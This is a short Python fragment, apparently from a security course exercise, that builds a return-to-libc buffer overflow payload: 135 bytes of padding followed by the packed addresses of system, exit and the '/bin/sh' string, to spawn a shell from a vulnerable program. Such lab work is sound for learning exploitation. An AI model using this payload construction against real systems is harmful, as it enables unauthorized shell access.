...
def get_arg() -> bytes:
    ...
    """
    offset = 135 #return adress is 135 bytes away, discovered from q1a core dump
    shellcode = (b'a' * offset) + struct.pack('<I', addresses.SYSTEM) + struct.pack('<I', addresses.EXIT) + struct.pack('<I', addresses.LIBC_BIN_SH) + bytes([0x42]) 
